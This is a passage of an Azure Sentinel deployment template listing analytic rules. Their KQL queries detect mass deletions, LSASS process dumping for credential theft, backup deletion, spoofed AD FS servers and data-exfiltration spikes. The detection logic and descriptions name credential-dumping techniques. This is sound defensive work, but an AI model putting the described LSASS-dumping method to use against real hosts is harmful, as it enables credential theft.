          "query": "let starttime = 14d;\nlet endtime = 1d;\nlet timeframe = 1h;\nlet TotalEventsThreshold = 25; \nlet TimeSeriesData = \nAzureActivity \n| where TimeGenerated between (startofday(ago(starttime))..startofday(ago(endtime)))\n| where OperationNameValue endswith \"delete\" \n| project TimeGenerated, Caller \n| make-series Total = count() on TimeGenerated from startofday(ago(starttime)) to startofday(ago(endtime)) step timeframe by Caller; \nlet TimeSeriesAlerts = materialize(TimeSeriesData \n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, 3, -1, 'linefit') \n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long) \n| where anomalies > 0 \n| project Caller, TimeGenerated, Total, baseline, anomalies, score \n| where Total > TotalEventsThreshold and baseline > 0 ); \nTimeSeriesAlerts \n| where TimeGenerated > (ago(endtime)) \n| project TimeGenerated, Caller \n| join kind = inner (AzureActivity \n| where TimeGenerated > (ago(endtime)) \n| where OperationNameValue endswith \"delete\" \n| summarize count(), make_set(OperationNameValue), make_set(Resource) by bin(TimeGenerated, 1h), Caller) on TimeGenerated, Caller \n| extend Name = iif(Caller has '@',tostring(split(Caller,'@',0)[0]),\"\")\n| extend UPNSuffix = iif(Caller has '@',tostring(split(Caller,'@',1)[0]),\"\")\n| extend AadUserId = iif(Caller !has '@',Caller,\"\")\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1485"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fa2658fe-3714-4c55-bb12-2b7275c628e8",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AnyAlert",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                },
                {
                  "identifier": "AadUserId",
                  "columnName": "AadUserId"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/768e410e-c0c1-4e2e-93f1-f9477cdf685d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/768e410e-c0c1-4e2e-93f1-f9477cdf685d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Dumping LSASS Process Into a File",
          "description": "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS).\nAfter a user logs on, the system generates and stores a variety of credential materials in LSASS process memory.\nThese credential materials can be harvested by an administrative user or system and used to conduct lateral movement using alternate authentication materials.\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\nRef: https://attack.mitre.org/techniques/T1003/001/",
          "severity": "High",
          "enabled": true,
          "query": "Event\n| where EventLog =~ \"Microsoft-Windows-Sysmon/Operational\" and EventID==10\n| parse EventData with * 'TargetImage\">' TargetImage \"<\" * 'GrantedAccess\">' GrantedAccess \"<\" * 'CallTrace\">' CallTrace \"<\" * \n| where GrantedAccess =~ \"0x1FFFFF\" and TargetImage =~ \"C:\\\\Windows\\\\System32\\\\lsass.exe\" and CallTrace has_any (\"dbghelp.dll\",\"dbgcore.dll\")\n| parse EventData with * 'SourceProcessGUID\">' SourceProcessGUID \"<\" * 'SourceImage\">' SourceImage \"<\" *\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by EventID, Computer, SourceProcessGUID, SourceImage, GrantedAccess, TargetImage, CallTrace\n| extend HostName = iif(Computer has '.',substring(Computer,0,indexof(Computer,'.')),Computer) , DnsDomain = iif(Computer has '.',substring(Computer,indexof(Computer,'.')+1),'')\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1003"
          ],
          "subTechniques": [
            "T1003.001"
          ],
          "alertRuleTemplateName": "a7b9df32-1367-402d-b385-882daf6e3020",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Process",
              "fieldMappings": [
                {
                  "identifier": "CommandLine",
                  "columnName": "SourceImage"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c042dcf4-e6f0-498b-b87c-a1a1f5a20442')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c042dcf4-e6f0-498b-b87c-a1a1f5a20442')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Private Preview) Create incidents based on Microsoft 365 Insider Risk Management",
          "description": "Create incidents based on all alerts generated in Microsoft 365 Insider Risk Management",
          "enabled": false,
          "productFilter": "Microsoft 365 Insider Risk Management",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "c805d9b1-97e7-4bc0-9172-67edb36273e4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/97919067-c44c-4254-95f0-06e803c16430')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/97919067-c44c-4254-95f0-06e803c16430')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Private Preview) Create incidents based on Microsoft 365 Insider Risk Management",
          "description": "Create incidents based on all alerts generated in Microsoft 365 Insider Risk Management",
          "enabled": false,
          "productFilter": "Microsoft 365 Insider Risk Management",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c59c5a72-79a9-441b-afa1-f7456d7cd523')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c59c5a72-79a9-441b-afa1-f7456d7cd523')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect CoreBackUp Deletion Activity from related Security Alerts",
          "description": "The query identifies any efforts by an attacker to delete backup containers, while also searching for any security alerts that may be linked to the same activity, in order to uncover additional information about the attacker's actions.' \nThough such an activity could be legitimate as part of business operation, some ransomware actors may perform such operation to cause interruption to regular business services.",
          "severity": "Medium",
          "enabled": true,
          "query": "SecurityAlert\n| extend Extprop = parse_json(ExtendedProperties)\n| mv-expand todynamic(Entities)\n| extend HostName = iff(isnotempty(tostring(Extprop[\"Compromised Host\"])), tolower(tostring(Extprop[\"Compromised Host\"])), tolower(tostring(parse_json(Entities).HostName)))\n| where isnotempty(HostName)\n| mv-expand todynamic(split(HostName, ','))\n| extend DnsDomain = iff(isnotempty(tostring(Extprop[\"Machine Domain\"])), tostring(Extprop[\"Machine Domain\"]), tostring(parse_json(Entities).DnsDomain))\n| extend UserName = iff(isnotempty(tostring(Extprop[\"User Name\"])), tostring(Extprop[\"User Name\"]), iff(tostring(parse_json(Entities).Type) == 'account', tostring(parse_json(Entities).Name), ''))\n| extend NTDomain = iff(isnotempty(tostring(Extprop[\"User Domain\"])), tostring(Extprop[\"User Domain\"]), tostring(parse_json(Entities).NTDomain))\n| extend IpAddress = iff(tostring(parse_json(Entities).Type) == 'ip', tostring(parse_json(Entities).Address), tostring(parse_json(Extprop).[\"IpAddress\"]))\n| summarize timestamp = arg_max(TimeGenerated, *) by AlertName, tostring(HostName)\n| project timestamp, AlertName, UserName, NTDomain, tostring(HostName), DnsDomain, IpAddress\n| join kind=inner\n(\nCoreAzureBackup\n| where State =~ \"Deleted\"\n| where OperationName =~ \"BackupItem\"\n| extend data = split(BackupItemUniqueId, \";\")\n| extend AzureLocation = data[0], VaultId=data[1], HostName=tolower(tostring(data[2])), DrivesBackedUp=data[3]\n| project timestamp = TimeGenerated, AzureLocation, VaultId, HostName, DrivesBackedUp, State, BackupItemUniqueId, _ResourceId, OperationName, BackupItemFriendlyName\n)\non HostName\n| project timestamp, AlertName, HostName, DnsDomain, UserName, NTDomain, _ResourceId, IpAddress, VaultId, AzureLocation, DrivesBackedUp, State, BackupItemUniqueId, OperationName, BackupItemFriendlyName\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "011c84d8-85f0-4370-b864-24c13455aa94",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AnyAlert",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "NTDomain"
                }
              ]
            },
            {
              "entityType": "AzureResource",
              "fieldMappings": [
                {
                  "identifier": "ResourceId",
                  "columnName": "_ResourceId"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7e184e7a-1892-41b3-95f8-4f8d3a58d82d')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7e184e7a-1892-41b3-95f8-4f8d3a58d82d')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New CloudShell User",
          "description": "Identifies when a user creates an Azure CloudShell for the first time.\nMonitor this activity to ensure only the expected users are using CloudShell.",
          "severity": "Low",
          "enabled": true,
          "query": "let match_window = 3m;\nAzureActivity\n| where ResourceGroup has \"cloud-shell\"\n| where (OperationNameValue =~ \"Microsoft.Storage/storageAccounts/listKeys/action\")\n| where ActivityStatusValue =~ \"Success\"\n| extend TimeKey = bin(TimeGenerated, match_window), AzureIP = CallerIpAddress\n| join kind = inner\n(AzureActivity\n| where ResourceGroup has \"cloud-shell\"\n| where (OperationNameValue =~ \"Microsoft.Storage/storageAccounts/write\")\n| extend TimeKey = bin(TimeGenerated, match_window), UserIP = CallerIpAddress\n) on Caller, TimeKey\n| summarize count() by TimeKey, Caller, ResourceGroup, SubscriptionId, TenantId, AzureIP, UserIP, HTTPRequest, Type, Properties, CategoryValue, OperationList = strcat(OperationNameValue, ' , ', OperationNameValue1)\n| extend Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "6d7214d9-4a28-44df-aafb-0910b9e6ae3e",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AnyAlert",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "UserIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/522b3e83-1ccd-4013-91aa-77192a7b4dd6')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/522b3e83-1ccd-4013-91aa-77192a7b4dd6')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Entra ID Hybrid Health AD FS New Server",
          "description": "This detection uses AzureActivity logs (Administrative category) to identify the creation or update of a server instance in an Microsoft Entra ID Hybrid Health AD FS service.\nA threat actor can create a new AD Health ADFS service and create a fake server instance to spoof AD FS signing logs. There is no need to compromise an on-premises AD FS server.\nThis can be done programmatically via HTTP requests to Azure. More information in this blog: https://o365blog.com/post/hybridhealthagent/",
          "severity": "Medium",
          "enabled": true,
          "query": "AzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue =~ 'Microsoft.ADHybridHealthService/services/servicemembers/action'\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| project-away claimsJson\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1578"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "88f453ff-7b9e-45bb-8c12-4058ca5e44ee",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.3"
        }
      }
    ]
  },
  {
    "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
    "contentVersion": "1.0.0.0",
    "parameters": {
      "workspace": {
        "type": "String"
      }
    },
    "resources": [
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/30ae0adc-ee59-47f4-b139-9ec82af234c3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/30ae0adc-ee59-47f4-b139-9ec82af234c3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Microsoft Entra ID Hybrid Health AD FS Suspicious Application",
          "description": "This detection uses AzureActivity logs (Administrative category) to identify a suspicious application adding a server instance to an Microsoft Entra ID Hybrid Health AD FS service or deleting the AD FS service instance.\nUsually the Microsoft Entra ID Connect Health Agent application with ID cf6d7e68-f018-4e0a-a7b3-126e053fb88d and ID cb1056e2-e479-49de-ae31-7812af012ed8 is used to perform those operations.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Microsoft Entra ID Connect Health Agent - cf6d7e68-f018-4e0a-a7b3-126e053fb88d\n// Microsoft Entra ID Connect - cb1056e2-e479-49de-ae31-7812af012ed8\nlet appList = dynamic(['cf6d7e68-f018-4e0a-a7b3-126e053fb88d','cb1056e2-e479-49de-ae31-7812af012ed8']);\nlet operationNamesList = dynamic(['Microsoft.ADHybridHealthService/services/servicemembers/action','Microsoft.ADHybridHealthService/services/delete']);\nAzureActivity\n| where CategoryValue =~ 'Administrative'\n| where ResourceProviderValue =~ 'Microsoft.ADHybridHealthService'\n| where _ResourceId has 'AdFederationService'\n| where OperationNameValue in~ (operationNamesList)\n| extend claimsJson = parse_json(Claims)\n| extend AppId = tostring(claimsJson.appid), AccountName = tostring(claimsJson.name), Name = tostring(split(Caller,'@',0)[0]), UPNSuffix = tostring(split(Caller,'@',1)[0])\n| where AppId !in (appList)\n| project-away claimsJson\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1528",
            "T1550"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "d9938c3b-16f9-444d-bc22-ea9a9110e0fd",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.3"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/60c69478-1cfc-4c1d-8a2e-35f1b2e1a598')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/60c69478-1cfc-4c1d-8a2e-35f1b2e1a598')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Suspicious number of resource creation or deployment activities",
          "description": "Indicates when an anomalous number of VM creations or deployment activities occur in Azure via the AzureActivity log. This query generates the baseline pattern of cloud resource creation by an individual and generates an anomaly when any unusual spike is detected. These anomalies from unusual or privileged users could be an indication of a cloud infrastructure takedown by an adversary.",
          "severity": "Medium",
          "enabled": true,
          "query": "let szOperationNames = dynamic([\"microsoft.compute/virtualMachines/write\", \"microsoft.resources/deployments/write\"]);\nlet starttime = 7d;\nlet endtime = 1d;\nlet timeframe = 1d;\nlet TimeSeriesData =\nAzureActivity\n| where TimeGenerated between (startofday(ago(starttime)) .. startofday(now()))\n| where OperationNameValue in~ (szOperationNames)\n| project TimeGenerated, Caller \n| make-series Total = count() on TimeGenerated from startofday(ago(starttime)) to startofday(now()) step timeframe by Caller; \nTimeSeriesData\n| extend (anomalies, score, baseline) = series_decompose_anomalies(Total, 3, -1, 'linefit')\n| mv-expand Total to typeof(double), TimeGenerated to typeof(datetime), anomalies to typeof(double), score to typeof(double), baseline to typeof(long) \n| where TimeGenerated >= startofday(ago(endtime))\n| where anomalies > 0 and baseline > 0\n| project Caller, TimeGenerated, Total, baseline, anomalies, score\n| join (AzureActivity\n| where TimeGenerated > startofday(ago(endtime)) \n| where OperationNameValue in~ (szOperationNames)\n| summarize make_set(OperationNameValue,100), make_set(_ResourceId,100), make_set(CallerIpAddress,100) by bin(TimeGenerated, timeframe), Caller\n) on TimeGenerated, Caller\n| mv-expand CallerIpAddress=set_CallerIpAddress\n| project-away Caller1\n| extend Name = iif(Caller has '@',tostring(split(Caller,'@',0)[0]),\"\")\n| extend UPNSuffix = iif(Caller has '@',tostring(split(Caller,'@',1)[0]),\"\")\n| extend AadUserId = iif(Caller !has '@',Caller,\"\")\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1496"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "361dd1e3-1c11-491e-82a3-bb2e44ac36ba",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Caller"
                },
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "CallerIpAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "2.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/e5e15648-9c3d-4a1b-8fc9-0853760fda31')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/e5e15648-9c3d-4a1b-8fc9-0853760fda31')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VM Threat Status Rank",
          "description": "This query finds all active Windows VMs that have been reporting to Log Analytics via the extension heartbeat.  The code indicates the ThreatStatusRank of the device. ThreatStatusRank is a code indicating the health of the device according to defender:\n150: Health\n470: Unknown (no extension Defender)\n350: Quarantined malware\n550: Active malware\n\nRef: https://aidanfinn.com/?p=22263#:~:text=ThreatStatusRank%3A%20A%20code%20indicating%20the%20health%20of%20the,to%20defender%3A%20150%3A%20Health%20470%3A%20Unknown%20%28no%20extension%2FDefender%29\n\nAM-7/2/24",
          "severity": "High",
          "enabled": true,
          "query": "let all_windows_vms = Heartbeat\n| where TimeGenerated > now(-30d)\n| where OSType == \"Windows\" | summarize makeset(Resource); ProtectionStatus\n| where Resource in (all_windows_vms)\n| where ThreatStatusRank != 150 //Filters out devices that are in a healthy state\n| sort by TimeGenerated desc\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3ce55c3a-10e5-4957-8f8d-5b3ea2687ae0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3ce55c3a-10e5-4957-8f8d-5b3ea2687ae0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Protection Status Disabled ",
          "description": "Lists computers where MDE is disabled.",
          "severity": "High",
          "enabled": true,
          "query": "ProtectionStatus\n| where Computer !contains \"hqsyslog\" //Covered by Crowdstrike\n| where DeviceName !in (\"vm-iso-misp\")\n| where ProtectionStatusRank != \"150\"",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": true,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/91a74e37-3e92-4217-8f7b-357c9b8e5bb5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/91a74e37-3e92-4217-8f7b-357c9b8e5bb5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Time series anomaly for data size transferred to public internet",
          "description": "Identifies anomalous data transfer to public networks. The query leverages built-in KQL anomaly detection algorithms that detects large deviations from a baseline pattern.\nA sudden increase in data transferred to unknown public networks is an indication of data exfiltration attempts and should be investigated.\nThe higher the score, the further it is from the baseline value.\nThe output is aggregated to provide summary view of unique source IP to destination IP address and port bytes sent traffic observed in the flagged anomaly hour.\nThe source IP addresses which were sending less than bytessentperhourthreshold have been exluded whose value can be adjusted as needed .\nYou may have to run queries for individual source IP addresses from SourceIPlist to determine if anything looks suspicious",
          "severity": "Medium",
          "enabled": true,
